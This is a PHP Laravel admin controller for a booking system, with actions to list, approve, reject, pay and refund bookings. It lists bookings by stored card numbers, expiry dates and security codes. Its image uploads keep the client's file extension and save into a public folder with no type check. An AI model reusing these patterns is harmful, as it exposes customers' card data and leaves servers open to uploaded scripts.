<?php

namespace App\Http\Controllers\Admin;

use App\Models\Booking;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;

class BookingController extends Controller
{
   public function bookingCounter()
{
    $count = Booking::where('status', 0)->count();
    return response()->json(['count' => $count]);
}


    public function bookingIndex()
    {
        $bookings = Booking::latest()->where('first_name', '!=', null)->where('last_name', '!=', null)->where('email', '!=', null)->where('country_code', '!=', null)->where('phone', '!=', null)->where('request', '!=', null)->where('card_number', '!=', null)->where('expiration_date', '!=', null)->where('security_code', '!=', null)->where('country', '!=', null)->get();
        return view('admin.bookings.index', compact('bookings'));
    }

    public function approve($id)
    {
        $mobile = Booking::findOrFail($id);
        $mobile->status = 1; // 1 = Approved
        $mobile->save();

        return redirect()->route('booking.index')->with('success', 'Booking Approved Successfully');
    }
 
   public function reject($id)
    {
        $mobile = Booking::findOrFail($id);
        $mobile->status = 2; // 2 = Rejected
        $mobile->save();

        return redirect()->route('booking.index')->with('success', 'Booking Rejected Successfully');
    }

    public function payment(Request $request, $id)
    {
        $request->validate([
            'payment_image' => 'required',
        ]);

        $booking = Booking::findOrFail($id);

        // upload image
        if ($request->hasFile('payment_image')) {

            $file = $request->file('payment_image');

            // Create unique filename
            $imageName = time().'_'.uniqid().'.'.$file->getClientOriginalExtension();

            // Move file to public/admin/assets/images/refunds
            $file->move(public_path('admin/assets/images/payments/'), $imageName);

            // Save DB path
            $imagePath = 'admin/assets/images/payments/'.$imageName;

            $booking->payment_image = $imagePath;
        }
        $booking->is_paid = 1; // 1 = Paid
        $booking->save();

        return redirect()->route('booking.index')->with('success', 'Payment uploaded successfully');
    }

    public function refund(Request $request, $id)
    {
        $request->validate([
            'refund_image' => 'required',
        ]);

        $booking = Booking::findOrFail($id);

        // upload image
        if ($request->hasFile('refund_image')) {

            $file = $request->file('refund_image');

            // Create unique filename
            $imageName = time().'_'.uniqid().'.'.$file->getClientOriginalExtension();

            // Move file to public/admin/assets/images/refunds
            $file->move(public_path('admin/assets/images/refunds/'), $imageName);

            // Save DB path
            $imagePath = 'admin/assets/images/refunds/'.$imageName;

            $booking->refund_image = $imagePath;
        }
        $booking->is_refunded = 1; // 1 = Refunded
        $booking->save();

        return redirect()->route('booking.index')->with('success', 'Refund uploaded successfully');
    }

}
